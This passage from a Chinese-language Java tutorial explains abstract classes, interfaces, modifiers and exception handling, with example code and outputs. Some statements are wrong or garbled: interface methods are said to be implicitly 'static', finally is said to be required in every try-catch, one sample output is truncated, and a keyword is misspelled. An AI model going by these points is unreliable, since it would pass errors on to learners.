3. ③有抽象⽅法⼀定是抽象类，是抽象类不⼀定有抽象⽅法。

4. ④抽象类不能直接实例化，但可以通过多态的⽅式实例化。

5. ⑤⼦类继承抽象⽅法时，必须重写⽗类中的所有抽象⽅法。


>    注意：
>
>    若⼦类不想重写抽象⽗类中的⽗类⽅法，则可以将⼦类也定义为抽象类，但是
>
>    该⼦类被其他类继承时，其他类除了重写⼦类中的抽象⽅法，还要重写⽗类中的抽象
>
>    ⽅法。(此⼦类⽗类时没把其他类带⼊的，⽽是单纯的写如题)

#### 3.构造⽅法                                                                                                        

抽象类中可以写**构造**⽅法，可以是有参也可以是⽆参。

该抽象类的构造⽅法可以在继承后的⼦类中⽤super调⽤。

```java
// ⽗类  抽象类
abstract class AbstractDemo {
    public AbstractDemo(String name){
        System.out.println("我是谁？-->" + name);
    }

    public abstract int sum(int a, int b);

}

// ⼦类继承⽗类
public class AbstractExtendsDemo extends AbstractDemo {

    public AbstractExtendsDemo(String name) {
        super(name);
        System.out.println("=============");
        System.out.println("我是⼦类，新名字是：" + name);
    }
    public int sum(int a, int b){
        return a+b;
    }
    
    public static void main(String[] args) {
        //实例化对象
        AbstractExtendsDemo a = new AbstractExtendsDemo("kevin");
    }

}


//执⾏结果
我是谁？-->kevin
=============
我是⼦类，新名字是：kev
```

通过控制台打印可以发现在出现⼦类时，在它之前还打印了⽗类的构造⽅法执⾏结果，于是⼜了以下结论。

>    结论：
>
>    在⽣成⼦类对象前，必须要先调⽤抽象⽗类的构造⽅法。

#### 4.语法                                                                                                          

```java
abstact class AbstactDemo{}
```

抽象类也有成员变量和⽅法当然他们的访问修饰符必须是`public、protected`，因为只有这样⼦类继承抽象类才能访问其成员变量和⽅法当然也可以使⽤private那样就⼦类就⽆法访问其成员变量和⽅法那么抽象类就没有任何意义了。

**抽象类存在的⼀个最⼤意义就是被继承**，当**被继承后就可以利⽤抽象类实现多态**。

示例：

```JAVA
// ⽗类
abstract class AbstractDemo {
	public abstract int sum(int a, int b);
}

// ⼦类继承⽗类
public class AbstractExtendsDemo extends AbstractDemo {
    public int sum(int a, int b){
    	return a+b;
	}
}
```

这⾥就要提到⼀个知识点:向上转型

关于⽅法：⽗类引⽤可以调⽤⼦类和⽗类公⽤的⽅法（如果⼦类重写了⽗类的⽅法，则调⽤⼦类的⽅法），但⼦类特有的⽅法⽆法调⽤。

关于属性：⽗类引⽤可以调⽤⽗类的属性，不可以调⽤⼦类的属性。

#### 5.使⽤场景                                                                                                        

示例：

```JAVA
abstract class AbstractAnimalDemo {
	abstract String takeBone(String name);
}

public class Dog extends AbstractAnimalDemo {
    public String takeBone(String name) {
    	return name + "捡了⼀根⻣头";
    }
}

public class Test {
	public static void main(String[] args) {
        Dog beautyDog = new Dog();
        String result = beautyDog.takeBone("蝴蝶⽝");
        System.out.println(result);
    }
}

// 执⾏结果
蝴蝶⽝捡了⼀根⻣头
```

上述代码分别⽤抽象类和接⼝类实现⼀些⾏为。抽象类中可以有抽象⽅法和普通⽅法，⽽接⼝⾥⾯只能是抽象⽅法。

所有⼦类继承抽象类可以重写抽象⽅法，也可以直接调⽤⽗类的普通⽅法，⽽接⼝就必须实现接⼝中的⽅法。

### ⼋、接⼝                                                                                                          

#### 1.定义                                                                                                          

简单的说，接⼝就是⼀种被规范的标准，只要复合这个标准都可以⽤，接⼝的表现在于对⾏为的抽象。就好⽐插
座，每个⼚商⽣产的插座我们都可以⽤，这是因为他们有统⼀的标准，这⾥插座就是接⼝。

#### 2.语法                                                                                                          

##### 格式1

```JAVA
public interface 接⼝名
```

##### 格式2

```JAVA
interface  接⼝名
```

#### 3.特点                                                                                                          

##### (1)多态的实例化⽤implement关键字

```JAVA
public  interface usb{}//定义⼀个接⼝

public  class  computer implements  usb{}//创建⼀个类实现接⼝
```

##### (2)接⼝不能被直接实例化，可以通过多态的形式实现实例化

```JAVA
usb  u = new computer();
```

##### (3)接⼝中都是抽象⽅法和常量，不可能有⾮抽象⽅法，常量必须被赋值。

常量默认被`public,static,final`**修饰⽅法**默认被`public,static,abstractl`修饰

```JAVA
public final int  num1=10;   // √
    num1=20;   // ×
    int num2=10;    // √
    num2=20;    // ×

// 上⾯两个正确的写法等价
public  abstract  void method1();    // √
	void  method2();    // √
```

直接int num=10，创建的a是常量

##### (4)多态的前提

-  有继承或实现关系
-  有⽅法的重写，
-  有⽗类或⽗接⼝引⽤指向⼦类或实现类对象

##### (5)接⼝的实现类

必须重写接⼝中的所有⽅法，不想重写则可以是抽象类（加上abstract）。

但是⼦类继承了该抽象类必须重写接⼝中的⽅法。

##### (6)接⼝只能被public修饰

#### 4.接⼝的使⽤                                                                                                       

在service包下定义

```java
package service;

public interface CommonService {
	int sum(int a, int b);
}
```

在service包的impl包下定义

```java
package service.impl;

import service.CommonService;

public class SumImpl implements CommonService {
	public int sum(int a, int b){
          return a+b;
      }
}
```

初始化对象，并使⽤

```java
import service.impl.SumImpl;

public class Test {
	public static void main(String[] args) {
        SumImpl s = new SumImpl();
        int sum_result = s.sum(10, 20);
        System.out.println(sum_result);
     }
}
```

执⾏结果

`30`

#### 5.类与接⼝的关系                                                                                                     

-  类和类之间是继承关系

-  接⼝和接⼝之间是继承关系

-  类和接⼝之间是实现关系（类实现接⼝）

类只⽀持单继承(即⼀个⼦类只有⼀个⽗类)，可以实现多个类。

接⼝之间可以多重继承。

```java
// ⼦类只能继承⼀个⽗类，但是可以实现多个接⼝
public class  A  extends  B implements C,B,D....{}

// 接⼝之间可以多重继承
public interface a extends b,c,d.....{}
```

##### 接⼝多重继承的好处

定义了许多接⼝，如果⼀个设备要同时实现那么多接⼝将是不⼩的开销，对于相同功能相同类的可以把它⽤⼀个接
⼝继承起来，这样这个接⼝有了那些接⼝的全部功能，我们使⽤类只要实现⼀个就可以了。

接⼝多重继承示例：

```java
// 加法接⼝
public interface SumService {
	int sum(int a, int b);
}

// 减法接⼝
public interface SubtractionService {
	int subtraction(int a, int b);
}

// 乘法接⼝
public interface MultiplicationService {
	int multiplication(int a, int b);
}

// 除法接⼝
public interface DivisionService {
	int division(int a, int b);
}
```

定义总接⼝，⽤来继承上⾯四个接⼝

```java
public interface CalculateService extends SumService, SubtractionService, 
  MultiplicationService, DivisionService{   
}
```

此时类实现接⼝的话，只需要实现CalculateService这个总结⼝即可。

```java
public class CalculateDemo implements CalculateService {
      public int sum(int a, int b){
          return a+b;
      }

  public int subtraction(int a, int b){
      if (a > b){
          return a - b;
      }else {
          return 0;
      }
  }

  public int multiplication(int a, int b){
      return a * b;
  }

  public int division(int a, int b){
      if (a == 0) {
          return 0;
      }else {
          return a/b;
      }
  }
}
```

实例化对象，调⽤⽅法

```java
  public class Test {
      public static void main(String[] args) {

      CalculateDemo cal = new CalculateDemo();
      int t1 = cal.sum(10, 20);
      int t2 = cal.subtraction(20, 10);
      int t3 = cal.multiplication(10, 20);
      int t4 = cal.division(40, 2);
      System.out.println(t1);
      System.out.println(t2);
      System.out.println(t3);
      System.out.println(t4);
  }
}
  
// 执⾏结果
30
10
200
20
```

>    特别说明：
>    接⼝中每⼀个⽅法也是隐式抽象的,接⼝中的⽅法会被隐式的指定为 public abstract（只能是 public 
>    abstract，其他修饰符都会报错）。
>
>    JDK 1.8 以后，接⼝允许包含具体实现的⽅法，该⽅法称为"默认⽅法"，默认⽅法使⽤ default 关键字修饰。
>    更多内容可参考 Java 8 默认⽅法。
>
>    接⼝中可以含有变量，但是接⼝中的变量会被隐式的指定为 public static final 变量（并且只能是 public，⽤ 
>    private 修饰会报编译错误）。
>    接⼝中的⽅法是不能在接⼝中实现的，只能由实现接⼝的类来实现接⼝中的⽅法。
>                                                                                  

## 第六节 Java修饰符      

在Java中，修饰符（Modifiers）是⼀种⽤于修改类、⽅法、变量和其他实体的访问权限、⾏为或特性的关键字。
Java提供了⼀组修饰符，可以⽤于实现对代码的封装、继承、多态和访问控制等功能。

### ⼀、访问修饰符（Access modifiers）                                                                         

在 Java 中，public、private、static 和 final 是四种不同的访问修饰符和关键字，⽤于控制类、⽅法和变量的访问
权限、⾏为和状态。

-  public：允许在任何位置访问。

-  private：仅允许在定义类的类中访问。

-  protected：允许在定义类的类、⼦类和同⼀包中的其他类中访问。

-  default(即默认，什么也不写）: 在同⼀包内可⻅，不使⽤任何修饰符。使⽤对象：类、接⼝、变量、⽅法。

我们通过下表来说明访问权限：

| 访问修饰符  | 访问范围                               | 是否能被子类继承   |
| ----------- | -------------------------------------- | ------------------ |
| `private`   | 本类内部                               | 不能被继承         |
| `default`   | 本类内部 + 同包的其他类                | 能被同包的子类继承 |
| `protected` | 本类内部 + 同包的其他类 + 非同包的子类 | 能被继承           |
| `public`    | 公开，能被所有类访问                   | 能被继承           |

#### 1.public                                                                                          

public 是 Java 中最常⻅的访问修饰符之⼀。它表示公共的，任何其他类都可以访问 public 修饰的类、⽅法或变
量。在⾯向对象编程中，public 关键字常⽤于声明类的成员（⽅法和变量），使它们能够被其他类使⽤。例如：

 

```
 public class MyClass {
      public void myMethod(){
          // 代码逻辑
      }
  }
```

上⾯的示例中，myMethod()⽅法被声明为 public，因此其他类可以访问和调⽤这个⽅法。

#### 2.protected                                                                                       

protected 修饰符⽤于指定成员的访问范围，可以被同⼀包内的类访问，以及⼦类（即使⼦类在不同的包中）。
protected 成员对于包外部的类是不可⻅的。通常⽤于提供对类的继承的控制，允许⼦类访问⽗类的成员。例如：

```
  public class MyClass {
      protected int myVariable;
  }
```

#### 3.default(package-private)                                                                        

没有显式修饰符的成员具有默认访问修饰符，也称为 package-private。它们只能被同⼀个包内的其他类访问，对
于包外部的类是不可⻅的。如果不指定访问修饰符，默认就是 package-private。例如：

```
  class MyClass {
      int myVariable;
  }
```

#### 4.private                                                                                         

private 是另⼀种访问修饰符，它表示私有的。私有成员只能在声明它们的类内部访问，其他类⽆法直接访问私有
成员。private 关键字通常⽤于隐藏类的实现细节，提供封装性，防⽌外部类直接访问和修改类的内部状态。例
如：

```
  public class MyClass {
      private int myVariable;

  public void setMyVariable(int value) {
      myVariable = value;
  }

  public int getMyVariable() {
      return myVariable;
  }

  }
```

在上⾯的示例中，myVariable 被声明为 private，因此只能通过 setMyVariable()和 getMyVariable()⽅法间接访问
和修改。

### ⼆、⾮访问修饰符（None-Access modifiers）                                                                   

-  static：⽤于将字段或⽅法标记为**静态**，可以在没有对象实例的情况下访问。

-  final：⽤于修饰**不可更改的类、⽅法或变量**。

-  abstract：⽤于创建**抽象类和抽象⽅法**。

-  synchronized：⽤于保证在**多线程环境中的同步访问**。

-  volatile：⽤于声明在**多个线程中共享的变量**，以确保线程之间的可⻅性。

-  transient：⽤于**阻⽌变量在序列化过程中的持久化**。
-  native：⽤于指示**⽅法是使⽤⾮Java代码实现的**。
-  strictfp：⽤于**类、接⼝、⽅法**，表示使⽤**严格的浮点计算**规则。

#### 1.static                                                                                          

static主要有如下4种使⽤场景：

-  静态变量： 使⽤static修饰的成员变量叫做静态变量，静态变量和⾮静态变量的区别是：静态变量被所有的对象所共享，在内存中只有⼀个副本，它当且仅当在类初次加载时会被初始化。⽽⾮静态变量是对象所拥有的，在创建对象的时候被初始化，存在多个副本，各个对象拥有的副本互不影响。static成员变量的初始化顺序按照定义的顺序进⾏初始化。
-  静态⽅法： 使⽤static修饰的成员⽅法叫做静态⽅法，静态⽅法可以不依赖于任何对象进⾏访问（对于静态⽅法来说，是没有this的），由于这个特性，在静态⽅法中不能访问类的⾮静态成员变量和⾮静态成员⽅法，因为⾮静态成员⽅法/变量都是必须依赖具体的对象才能够被调⽤。
   
-  静态代码块：定义在类中⽅法外，先于⾮静态代码块之前执⾏（静态代码块 -> ⾮静态代码块 -> 构造⽅法） ，⽽且不管执⾏多少次创建新对象的操作，静态代码只执⾏⼀次；

```java
// 静态代码块的使⽤
public class StaticBlock {
    int i;
    static int num;
    
    // 静态代码块，通常⽤于为类的运⾏做初始化操作
    static {
    	num = 20;
	}
}
```

 静态内部类：static 要修饰类时，只有修饰内部类这⼀种⽤法。 静态内部类与⾮静态内部类之间存在⼀个最⼤的区别: ⾮静态内部类在编译完成之后会隐含地保存着⼀个引⽤，该引⽤是指向创建它的外围类，但是静态内部类却没有。没有这个引⽤就意味着：1. 它的创建是不需要依赖外围类的创建。2. 它不能使⽤任何外围类的⾮ static 成员变量和⽅法。

>    注意：
>
> - abstract ⽅法不能同时是 static 的，因为 abstract ⽅法需要被重写，但 static ⽅法不可以；
>
> -   不能从 static ⽅法内部发出对⾮静态⽅法的调⽤，因为静态⽅法只能访问静态成员，⽽⾮静态⽅法的调
>       ⽤需要先创建对象；
> - static 不能⽤于修饰局部变量；
> - 内部类与静态内部类的区别：静态内部类相对外部类是独⽴存在的，在静态内部类中⽆法直接访问外部
>       类中变量和⽅法。如果要进⾏访问，则必须 new ⼀个外部类对象，使⽤该对象来进⾏访问，但对于静
>       态变量和静态⽅法，能够直接调⽤。⽽普通的内部类作为外部类的⼀个成员⽽存在，能够直接访问外部
>       类属性，调⽤外部类⽅法。

static 关键字⽤于声明静态成员，静态成员属于类⽽不是对象，因此可以直接通过类名访问，⽆需实例化对象。

静态成员在内存中只有⼀份拷⻉，所有实例共享。常⽤于定义⼯具类、常量等。例如：

```java
public class MyClass {
  public static int myStaticVariable;

  public static void myStaticMethod() {
      // 代码逻辑
  }
}
```

在上⾯的示例中，myStaticVariable 和 myStaticMethod()都是静态的，可以通过 MyClass.myStaticVariable 和 MyClass.myStaticMethod()来访问。

#### 2.final                                                                                           

final 关键字，意思是最终的、不可修改的，最⻅不得变化 ，⽤来修饰类、⽅法和变量，具有以下特点：

-  修饰类：类不能继承，final 类中的所有成员⽅法都会被隐式的指定为 final ⽅法；
-  修饰符变量：该变量为常量，，如果是基本数据类型的变量，则其数值⼀旦在初始化之后便不能更改；如果是引⽤类型的变量，则在对其初始化之后便不能让其指向另⼀个对象。
-  修饰符⽅法：⽅法不能重写

说明：使⽤ final ⽅法的原因有两个，第⼀个原因是把⽅法锁定，以防任何继承类修改它的含义；第⼆个原因是效率。

在早期的 Java 实现版本中，会将 final ⽅法转为内嵌调⽤。但是如果⽅法过于庞⼤，可能看不到内嵌调⽤带来的任何性能提升（现在的 Java 版本已经不需要使⽤ final ⽅法进⾏这些优化了）。类中所有的 private ⽅法都隐式地指定为 final。

final 关键字⽤于声明不可变的常量、⽅法和类。对于不可变的常量，它们的值在初始化后不能被修改。对于⽅法，
final 表示⽅法不能被⼦类重写。对于类，final 表示类不能被继承。例如：

```java
public class MyClass {
  public static final int MY_CONSTANT = 10;

  public final void myFinalMethod() {
      // 代码逻辑
  }
}
```

在上⾯的示例中，MY_CONSTANT 被声明为 final，其值不能被修改。

同时，myFinalMethod()被声明为 final，不能被⼦类重写。

#### 3.abstract                                                                                        

abstract 修饰符⽤于声明抽象类和抽象⽅法。

抽象类是不能被实例化的类，它通常包含⾄少⼀个抽象⽅法，⽽抽象⽅法是没有⽅法体的⽅法，需要由⼦类实现。

例如：

```java
public abstract class MyAbstractClass {
	public abstract void myAbstractMethod();
}
```

#### 4.synchronized                                                                                                

synchronized 关键字⽤于保护多个线程同时访问共享资源时的⼀致性。

当⼀个⽅法或⼀个代码块被 synchronized 修饰时，它只允许⼀个线程访问该⽅法或代码块，其他线程则被阻塞，直到该线程执⾏完毕释放锁。

```java
class Counter {
	private int count = 0;

    // synchronized ⽅法
    public synchronized void increment() {
        count++;
    }

    // synchronized 代码块
    public void decrement() {
        synchronized(this) {
            count--;
        }
    }

    public int getCount() {
        return count;
    }
}
```

#### 5.volatile                                                                                                    

volatile 修饰符⽤于声明变量是易变的，即可能被多个线程同时访问和修改。

使⽤ volatile 修饰的变量的值会被存储在主内存中，⽽不是线程的本地内存中，这样可以确保多个线程看到的是同⼀份最新的值。例如：

```java
public class MyThread extends Thread {
	private volatile boolean flag;

    public void run() {
        while (!flag) {
        // 代码逻辑
        }
    }

    public void stopThread() {
    	flag = true;
    }
}
```

#### 6.transient                                                                                                   

transient 修饰符⽤于指示变量不会被序列化。当对象被序列化时，被 transient 修饰的变量的值不会被保存。

这通常⽤于标记不需要持久化的敏感数据或临时状态。例如：

```java
public class MyClass implements Serializable {
    private transient int sensitiveData;
}
```

#### 7.native                                                                                                      

native 关键字表示该⽅法的实现由本地⾮ Java 代码提供。这通常⽤于与本地系统库进⾏交互，⽐如 C 或 C++代码。

```java
public class NativeExample {
    // 声明本地⽅法
    public native void nativeMethod();

    // 加载动态链接库
    static {
        System.loadLibrary("NativeLibrary");
    }

    public static void main(String[] args) {
        NativeExample example = new NativeExample();
        // 调⽤本地⽅法
        example.nativeMethod();
    }

}
```

在上⾯的示例中，nativeMethod() 是⼀个本地⽅法，其实现由本地库提供。在调⽤该⽅法之前，需要加载包含该⽅法实现的本地库。

#### 8.strictfp                                                                                                    

strictfp 关键字⽤于确保浮点运算在不同平台上的结果⼀致性。当⼀个类被声明为 strictfp 时，该类中所有包含浮点运算的⽅法都会按照 IEEE 754 标准来执⾏，⽆论运⾏环境是否⽀持 IEEE 754 标准。

```java
public strictfp class StrictfpExample {
    public strictfp double calculate(double x, double y) {
        return x / y;
    }

    public static void main(String[] args) {
        StrictfpExample example = new StrictfpExample();
        double result = example.calculate(10.0, 3.0);
        System.out.println("Result: " + result);
    }

}
```

### 三、访问控制和继承（修饰符的组合使⽤）                                                                               

在实际的java开发中，修饰符可以组合使⽤，以达到更精确的控制和⾏为。以下是⼀些常⻅的修饰符组合示例：

-  public static final：常量的修饰符组合，表示公共的、静态的和不可变的常量。

  ```
  public static final int MAX_SIZE = 10;
  ```

-  private static：静态变量的修饰符组合，表示私有的静态变量，只能在类内部访问。

  ```
    private static int counter = 0;
  ```

-  protected abstract：抽象⽅法的修饰符组合，表示受保护的抽象⽅法，需要⼦类实现。

  ```
  protected abstract void performAction();
  ```


修饰符的组合使⽤可以根据实际需求和设计原则来灵活选择，以满⾜代码的要求和规范。

⽅法的继承规则

-  ⽗类中声明为 public 的⽅法在⼦类中也必须为 public。

-  ⽗类中声明为 protected 的⽅法在⼦类中要么声明为 protected，要么声明为 public，不能声明为 private。

-  ⽗类中声明为 private 的⽅法，不能够被⼦类继承。

## 第七节 异常处理                                                                                          

### ⼀、什么是异常                                                                                           

异常是程序在“编译”或者“执⾏”的过程中可能出现的错误或问题，⽽不是语法问题导致的编译错误，语法错误不算
在异常体系中，语法错误是⾃⼰的代码⽔平问题引起的。
⽐如：数组索引越界异常、空指针异常、⽇期格式化异常，等....

为什么要学习异常？

-  异常⼀旦出现了，如果没有提前处理，程序就会退出JVM虚拟机⽽终⽌。

   学习异常不是让我们以后不出异常，⽽是程序出了异常之后，该如何处理。体现的是程序的安全，健壮性。

-  Error：错误，Error是⼀种特殊的类(java.lang.Error)，与普通的Exception异常类不同，Error是程序⽆法处理的错误，Error类及其⼦类是指我们程序处理不了或者说不该由程序处理的错误，这类错误往往代表JVM在运⾏过程中出了问题， Error不应该由应⽤程序捕获和处理，⽽是由虚拟机⾃⼰处理，通常代表着虚拟机和系统级别的问题。
   
-  ⼀些常⻅的Error⽐如：

-   Virtual MachineError：Java 虚拟机运⾏错误 

- 内存溢出
  -  OutOfMemoryError --- 堆内存溢出

  -  StackOverflowError --- 栈内存溢出
  
-  java.lang.NoClassDefFoundError:当虚拟机⽆法找到(找不到)要加载的类时抛出的错误。

-  LinkageError：当类加载过程出现链接错误时抛出的错误。

![image-20240912162107108](https://image.201068.xyz/assets/32.JAVA/image-20240912162107108.png)

#### Error

-  系统级别问题、JVM退出等，代码⽆法控制。

#### Exception

java.lang包下，称为异常类，它表示程序本身可以处理的问题

-  RuntimeException及其⼦类：运⾏时异常，编译阶段不会报错。（例如：空指针异常，数组索引越界异常）

-  除RuntimeException之外所有的异常：编译时异常，编译期必须处理的，否则程序不能通过编译。（例如：
   ⽇期格式化异常）

### ⼆、异常处理                                                                                            

为了保证程序能正常的运⾏，我们需要对出现的异常错误进⾏及时的处理。在java 的异常处理机制当中，当某个⽅
法出现异常时，可以在该⽅法⾥进⾏捕捉，然后处理异常，也可以将异常向上抛出，交给该⽅法的调⽤者处理。

如果对产⽣的异常不做任何的处理，程序就会异常终⽌。所以需要对该异常进⾏捕捉然后处理。

#### 1.捕获异常                                                                                            

java的异常捕获语法结构为：

```java
try{
    // 可能产⽣异常错误的语句
}catch（ ExceptionTypeOne  e）{
    // 对异常 ExceptionTypeOne 的处理语句
}catch ( ExceptionTypeTwo e) {
    // 对ExceptionTypeTwo 的处理语句
}
...........
finally {
    // 语句块
}
```

此结构由try，catch，finally 3部分组成，其中：

1. ①  try语句中的是可能发⽣异常的代码

2. ②  catch⽤来捕捉异常，{}中为异常处理的语句
3. ③  finally为异常处理的最后执⾏部分，⽆论前⾯的catch是否被捕捉，finally语句都会被执⾏

其中的Exception是try代码块传递给catch代码块的变量类型，e是变量名。

示例代码：

```java
public class TryExceptionDemo {
    public static void main(String[] args) {
        try {
            int a = 1;
            int b = 0;
            System.out.println("a的值是"+a);
            System.out.println("b的值是"+b);
            int result = a/b;
            System.out.println("a除以b的值是"+result);
        }catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("Hello world");
    }
}
```

执⾏结果：

```java
a的值是1
b的值是0
Hello world
java.lang.ArithmeticException: / by zero

at chapter07.TryExceptionDemo.main(TryExceptionDemo.java:10)

进程已结束,退出代码0
```

catch代码块中的语句e.printStackTrace()语句是⽤于输出错误性质，通常情况下，异常处理⽤下⾯三个函数来获取异常有关信息：

```java
getMessage()   // 输出错误性质

toString() // 给出⼀场的性质和类型

printStackTrace() // 指出异常类型、性质、栈层次及出现在程序的位置
```

从结果中发现，a和b的值都被打印，但是result的值没有被打印，`try - catch` 语句外的打印`Hello world`的语句也被打印。

紧接着的⼀⾏就是`Process finished  with  exit  code  0`表示程序正常退出。

多个catch语句的代码示例：

```JAVA
public class MultiCatchDemo {
    private static int test(int x, int y) throws MyException{
        if (y < 0) {
            throw new MyException("除数不能为负数");
        }
        return x/y;
    }

    public static void main(String[] args) {
        try {
            // int result = test(2, -1);
            int r1 = test(2, 0);
        }catch (MyException e) {
            System.out.println(e.getMessage());
        }catch (ArithmeticException e) {
            System.out.println(e.getMessage());
        }catch (Exception e) {
            System.out.println("发⽣了异常");
        }
    }

}

class MyException extends Exception{
    String message;
    public MyException(String name){
        this.message = name;
    }

    @Override
    public String getMessage() {
        return message;
    }

}
```

上⾯的示例使⽤了多个catch语句来捕捉异常，其中：

1. ① 调⽤Test （2 ， -1 ） 将会发⽣MyException异常，进⽽转⼊catch (MyException e)执⾏；

2. ② 调⽤Test （2 ， 0） 将会发⽣ArithmeticException异常，转⼊对应的catch语句执⾏；

3. ③  如果还有除了 0 和 负数之外的异常，那么将会被Exception e捕捉然后转⼊catch语句执⾏；

但是由于  Exception是所有异常类的⽗类，如果将其与MyException调换位置，那么前⾯的 ArithmeticException异常和 MyException 异常都会被第⼀个catch语句捕捉，后⾯的catch语句就不会执⾏，最后就只会收到⼀个发⽣了其他异常的字符串提示，对于异常的处理没有任何的帮助，try - catch语句也就是去了它的意义。

通过try - catch 语句，程序没有异常退出，⽽是将错误抛出后，继续执⾏try  -  catch 异常捕捉后⾯的语句，⽽不⾄于因为⼀个异常从⽽影响整个程序的运⾏。

#### 2.finally语句                                                                                       

⼀个完整的`try - catch` 语句⼀定要包含finally语句，⽆论程序是否有异常发⽣，并且⽆论之间的try -  catch语句是否顺利执⾏完毕，都会执⾏finally语句。

但是也存在意外，finally语句不会被执⾏的情况，如下：

1. ① 在finally 语句中发⽣了异常

2. ② 在前⾯的代码中使⽤了System.exit()语句，程序提前结束

3. ③ 程序所有的线程死亡

4. ④ 关闭CPU


#### 3.finally语句中的throw和return                                                                         

⽆论有没有异常都会执⾏finally语句，那么如果在try-catch语句块中遇到了return和throw语句，后⾯的finally语句是否还会执⾏？

示例：

```JAVA
public class FinallyDemo {
    public static void main(String[] args) {
        System.out.println("return value of getValue():"+getValue());
    }

    public static int getValue(){
        try {
            return 0;
        }finally {
            return 1;
        }
    }
}
```

程序运⾏的结果是什么？

解析：当Java程序执⾏ty块、catch块时遇到了retun语句， 并不会⽴⻢结束这个⽅法，⽽是去寻找该异常处理流程中是否包含finally语句块，如果没有finally块，⽅法终⽌，返回相应的返回值。

如果有finally块, 系统⽴即开始执⾏finally块中的语句，只有当finally块执⾏完成后，系统才会再次回到try-catch语句中来根据return语句结束⽅法。

如果finally块⾥使⽤了return语句，则finally块会直接执⾏return语句并返回，使⽅法结束，系统将不会跳回去执⾏try块、 catch块⾥的任何代码。

执⾏结果：

```JAVA
return value of getValue():1
```

### 三、常⻅异常                                                                                            

java内部提供了⼀些异常，⽤来描述经常发⽣的错误，其中，有的需要程序员极性捕捉处理或声明抛出。

有的是由java虚拟机⾃动进⾏捕捉。

java常⻅的异常类如表：

![image-20240912162951934](https://image.201068.xyz/assets/32.JAVA/image-20240912162951934.png)


以上异常的出现场景希望同学们可以⾃⾏研究。

### 四、⾃定义异常                                                                                                       

使⽤java内置的异常类可以处理在编程期间出现的⼤多数异常情况，但是仍有部分⽐较有特性的异常是java内置异常没有覆盖到的。

例如：对于需要传⼊整数的⼀个⽅法，你可能会觉得，传⼊⼀个负数是不符合你的期望，认为负数作为这个⽅法的参数为⼀个错误的值，但是对于java来说，它不会将其视为⼀个错误或者异常。

所以为了能个性化地去解决这些在特殊情况才能出现的异常，java引⼊了⾃定义异常类，⽤户只需要继承Exception类即可以⾃定义异常类。

#### 1.如何⾃定义异常类                                                                                                    

① ⾸先，在java中异常都是作为类的实例的形式出现的，所以我们应该先定义⾃定义的类，类名设为MyException（⾃定义类名视使⽤场景况⽽定），然后由该类继承Exception类。

代码示例：

```JAVA
public class MyException extends Exception{    // 声明这个MyException类并让其继承Exception类
    public MyException (String message){    // 调⽤构造⽅法
        super(message);   // 给⽗类Exception传参
    }
}
// 字符串message是要输出的错误信息。
```

② 使⽤throw关键字，在需要的时候抛出异常，我们使⽤⾃定义异常配合try-catch语句来模拟这个过程：

代码示例：

```JAVA
public class CustomException {
    public static void main(String[] args) {
        int[] arr = new int[10];
        try {
            set(arr, -4, 10);
        }catch (MyException e) {
            System.out.println(e);
        }
    }

    public static void checkMySet(int pos, int len) throws MyException{
        if (pos >= len) {
            throw new MyException("指定的下标超过已有集合的⻓度");
        }else if (pos < 0) {
            throw new MyException("指定的下标下于0");
        }else {
            System.out.println("下标数值正确");
        }
    }

    public static void set(int[] arr, int pos, int element) throws MyException{
        checkMySet(pos, arr.length);
        arr[pos] = element;
    }

}
```

执⾏结果：

```JAVA
MyException: 指定的下标下于0

进程已结束,退出代码0
```

程序正常退出。

#### 2.throw关键字                                                                                                    

throw关键字通常**⽤于⽅法体中**，并且**抛出⼀个异常的实例化对象，对象被抛出后程序终⽌**。


可以看到，如果在⽅法体内抛出对象的语句后⾯加上语句，那么后⾯的语句将永远不会执⾏到。

示例代码：

```JAVA
public class Main {
    private static void Test(int pos) throws MyException{
        if(pos >= 0){
            throw new MyException("pos >= 0");
        }
        System.out.println("checkEnded");
    }
    public static void main(String[] args) {
        int[] arr = new int[10];
        try {
            System.out.println("TestStart");
            Test(0);
            System.out.println("TestEnd");
        } catch (MyException e) {
            System.out.println(e);  // 进⾏捕捉
        }
    }
}
```

执⾏结果：

```JAVA
TestStart
MyException: pos >= 0

进程已结束,退出代码0
```

可以看出来，在⽅法抛出异常后，该⽅法后⾯的语句也不会执⾏。

此外，**throw必须写在⽅法体内部** ，抛出的对象必须是Exception 或者 Exception 的⼦类对象。

如果抛出的是 RunTimeException 或者 RunTimeException 的⼦类，则可以不⽤处理，直接交给JVM来处理  如果抛出的是编译时异常，⽤户必须处理，否则⽆法通过编译 。异常⼀旦抛出，其后的代码就不会执⾏。

#### 3.throws关键字                                                                                       

 `throws`关键字通常被⽤来在**声明⽅法**的时候，**指定其⽅法可能抛出的异常**，多个异常可以⽤“`,`”逗号分割。

```JAVA
public static void Test ()  throws  Exception1 , Exception2 , Exception3 {
    //可能会抛出Exception1 , Exception2 , Exception3异常的⽅法体
}
```

从上⾯的代码案例中我们可以看到：checkMySet()⽅法中加⼊了if 语句来来判断是否抛出异常，有可能会抛出，也可能不会抛出，只要有抛出的可能，就需要在其⽅法后⽤throws关键字声明可能会抛出的异常类。

throws在⽅法声明时参数列表之后，当⽅法中抛出编译时异常，⽤户不想处理该异常，此时就可以借助throws 将异常抛给⽅法的调⽤者来处理。异常被throws 不断向上抛出，最终被catch 捕获并处理。

需要注意的是： 

1. ① throws必须跟在⽅法的参数列表之后；

2. ② 声明的异常必须是 Exception 或者 Exception 的⼦类；

### 五、运⾏时异常                                                                                           

RuntimeException 异常是程序运⾏过程中产⽣的异常。它是Exception类的⼦类之⼀。

![image-20240912163216984](https://image.201068.xyz/assets/32.JAVA/image-20240912163216984.png)

java类库的每个包中都定义了异常类，所有的类都是Throwable的⼦类，Throwable派⽣出两个⼦类，分别是Exception 和 Error 类。 Error 类及其⼦类⽤来描述java运⾏系统中的内部错误以及资源消耗的错误。

Exception类异常通过捕捉后程序可以继续正常执⾏。

![image-20240912163232112](https://image.201068.xyz/assets/32.JAVA/image-20240912163232112.png)

其中RuntimeException的异常种类从图中可以看出来，Throwable 是异常处理体系的顶层类，派⽣除了Error 和 Exception 两个重要的⼦类。Error 指的是java虚拟机⽆法解决的严重问题，例如jvm内部错误，资源耗尽等等，其代表为： StackOverflowError  和 OutOfMemoryError。

Exception 异常类为程序员可以正常捕捉并处理的异常。

![image-20240912163254609](https://image.201068.xyz/assets/32.JAVA/image-20240912163254609.png)

### 六、异常处理流程                                                                                          

程序先执⾏ try 中的代码 如果 try 中的代码出现异常，就会结束 try 中的代码，得到的异常与 catch 中的异常类型去匹配。如果找到匹配的异常类型, 就会执⾏ catch 中的代码。

